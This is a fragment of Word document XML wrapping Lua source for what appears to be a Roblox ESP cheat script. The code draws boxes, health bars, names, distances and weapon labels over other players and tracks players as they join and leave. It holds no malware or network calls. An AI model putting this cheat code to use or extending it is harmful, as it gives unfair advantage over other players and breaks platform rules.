        <w:t xml:space="preserve">                                            LeftSide.Size = UDim2.new(0, 1, 0, h / 5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomSide.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y + h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomSide.Size = UDim2.new(0, 1, 0, h / 5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomDown.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomDown.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y + h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomDown.Size = UDim2.new(0, w / 5, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightTop.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightTop.Position = UDim2.new(0, Pos.X + w / 2, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightTop.Size = UDim2.new(0, w / 5, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightSide.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightSide.Position = UDim2.new(0, Pos.X + w / 2 - 1, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightSide.Size = UDim2.new(0, 1, 0, h / 5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightSide.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightSide.Position = UDim2.new(0, Pos.X + w / 2, 0, Pos.Y + h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightSide.Size = UDim2.new(0, 1, 0, h / 5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightDown.Visible = Config.ESP.Drawing.Boxes.Corner.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightDown.Position = UDim2.new(0, Pos.X + w / 2, 0, Pos.Y + h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightDown.Size = UDim2.new(0, w / 5, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do -- // Bounding Boxes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if not Config.ESP.Drawing.Boxes.Corner.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftTop.Visible = Config.ESP.Drawing.Boxes.Bounding.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftTop.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftTop.Size = UDim2.new(0, w, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftSide.Visible = Config.ESP.Drawing.Boxes.Bounding.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LeftSide.Size = UDim2.new(0, 1, 0, h)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomSide.Visible = Config.ESP.Drawing.Boxes.Bounding.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y + h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomSide.Size = UDim2.new(0, w, 0, 1) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightSide.Visible = Config.ESP.Drawing.Boxes.Bounding.Enabled </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightSide.Position = UDim2.new(0, Pos.X + w / 2 - 1, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightSide.Size = UDim2.new(0, 1, 0, h) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightSide.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomRightDown.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BottomDown.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RightTop.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do -- Boxes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Box.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Box.Size = UDim2.new(0, w, 0, h)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Box.Visible = Config.ESP.Drawing.Boxes.Full.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        -- Animation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if Config.ESP.Drawing.Boxes.Animate then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            RotationAngle = RotationAngle + (tick() - Tick) * Config.ESP.Drawing.Boxes.RotationSpeed * math.cos(math.pi / 4 * tick() - math.pi / 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Gradient1.Rotation = RotationAngle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Gradient2.Rotation = RotationAngle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Tick = tick()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    -- Healthbar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            local is_inf = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            if Humanoid.Health ~= Humanoid.Health then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                health = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                is_inf = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Healthbar.Position = UDim2.new(0, Pos.X - w / 2 - 6, 0, Pos.Y - h / 2 + h * (1 - health))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Healthbar.Size = UDim2.new(0, Config.ESP.Drawing.Healthbar.Width, 0, h * health)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Healthbar.BackgroundTransparency = Config.ESP.Drawing.Healthbar.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BehindHealthbar.Position = UDim2.new(0, Pos.X - w / 2 - 6, 0, Pos.Y - h / 2) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BehindHealthbar.Size = UDim2.new(0, Config.ESP.Drawing.Healthbar.Width, 0, h) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BehindHealthbar.BackgroundTransparency = Config.ESP.Drawing.Healthbar.Transparency</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            HealthbarGradient.Enabled = Config.ESP.Drawing.Healthbar.Gradient</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            HealthbarGradient.Color = ColorSequence.new{</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                ColorSequenceKeypoint.new(0, Config.ESP.Drawing.Healthbar.GradientRGB1),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                ColorSequenceKeypoint.new(1, Config.ESP.Drawing.Healthbar.GradientRGB2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            HealthbarGradient.Offset = Vector2.new(0, health - 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            local color = getHealthColor(health_clamped , Humanoid.MaxHealth)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            local healthtexttext = tostring(math.floor(health_clamped))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            if is_inf then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                healthtexttext = "inf"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                color = getHealthColor(Humanoid.MaxHealth, Humanoid.MaxHealth)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Healthbar.BackgroundColor3 = not Config.ESP.Drawing.Healthbar.Gradient and color or Color3.new(1,1,1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            -- Health Text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Healthbar.Visible = Config.ESP.Drawing.Healthbar.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            BehindHealthbar.Visible = Config.ESP.Drawing.Healthbar.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                if Config.ESP.Drawing.Healthbar.HealthText then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    local healthPercentage = math.floor(health_clamped / Humanoid.MaxHealth * 100)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    if is_inf then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                        healthPercentage = 100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    HealthText.Position = UDim2.new(0, Pos.X - w / 2 - 18 --[[6]], 0, Pos.Y - h / 2 + h * (1 - healthPercentage / 100) + 3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    HealthText.Text = healthtexttext</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    HealthText.TextSize = Config.ESP.FontSize</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    --HealthText.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    HealthText.Visible = Config.ESP.Drawing.Healthbar.HealthText</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    HealthText.TextStrokeTransparency = Config.ESP.Drawing.Healthbar.HealthTextTransparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    if Config.ESP.Drawing.Healthbar.Lerp then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                        HealthText.TextColor3 = color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                        HealthText.TextColor3 = Config.ESP.Drawing.Healthbar.HealthTextRGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    HealthText.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do -- Names</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Name.Visible = Config.ESP.Drawing.Names.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Name.Text = plr.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            if Config.ESP.Options.Friendcheck and lplayer:IsFriendsWith(plr.UserId) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Name.Text = string.format('(&lt;font color="rgb(%d, %d, %d)"&gt;F&lt;/font&gt;) %s', Config.ESP.Options.FriendcheckRGB.R * 255, Config.ESP.Options.FriendcheckRGB.G * 255, Config.ESP.Options.FriendcheckRGB.B * 255, plr.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Name.Position = UDim2.new(0, Pos.X, 0, Pos.Y - h / 2 - 9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do -- Distance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            if Config.ESP.Drawing.Distances.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Weapon.Position = UDim2.new(0, Pos.X, 0, Pos.Y + h / 2 + 7)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                --WeaponIcon.Position = UDim2.new(0, Pos.X - 21, 0, Pos.Y + h / 2 + 15);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Distance.Position = UDim2.new(0, Pos.X, 0, Pos.Y + h / 2 + (Weapon.Visible and 18 or 7))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Distance.Text = string.format("%d Studs", math.floor(Dist))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Distance.Visible = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                --Distance.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Weapon.Position = UDim2.new(0, Pos.X, 0, Pos.Y + h / 2 + 8)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                Distance.Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    do -- Weapons</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Weapon.Visible = Config.ESP.Drawing.Weapons.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            --Weapon.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    HideESP();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                HideESP();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            HideESP();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HideESP();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            coroutine.wrap(Updater)();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        do -- Update ESP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, v in pairs(Players:GetPlayers()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if v ~= lplayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    coroutine.wrap(ESP)(v)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    --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Players.PlayerAdded:Connect(function(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                coroutine.wrap(ESP)(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Players.PlayerRemoving:Connect(function(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Players_ESP[v.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name].RefreshElements = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name].CharacterAdded:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name].CharacterAdded = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name].ToolConnection_Added:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name].ToolConnection_Removed:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name].ToolConnection_Removed = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name].ToolConnection_Added = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players_ESP[v.Name] = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if not Mobile then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local uis = Services.UserInputService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local players = Services.Players</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local ws = Services.Workspace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rs = Services.ReplicatedStorage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local http_service = Services.HttpService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local gui_service = Services.GuiService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local lighting = Services.Lighting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local run = Services.RunService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local stats = Services.Stats</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local coregui = Services.CoreGui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local debris = Services.Debris</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local tween_service = Services.TweenService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local sound_service = Services.SoundService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local run_service = Services.RunService</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local vec2 = Vector2.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local vec3 = Vector3.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local dim2 = UDim2.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local dim = UDim.new </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rect = Rect.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local cfr = CFrame.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local empty_cfr = cfr()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local point_object_space = empty_cfr.PointToObjectSpace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local angle = CFrame.Angles</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local dim_offset = UDim2.fromOffset</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local color = Color3.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rgb = Color3.fromRGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hex = Color3.fromHex</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hsv = Color3.fromHSV</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rgbseq = ColorSequence.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rgbkey = ColorSequenceKeypoint.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local numseq = NumberSequence.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local numkey = NumberSequenceKeypoint.new</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local camera = ws.CurrentCamera</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local lp = players.LocalPlayer </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local mouse = lp:GetMouse() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local gui_offset = gui_service:GetGuiInset().Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local max = math.max </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local floor = math.floor </w:t>
      </w:r>
    </w:p>
    <w:p>
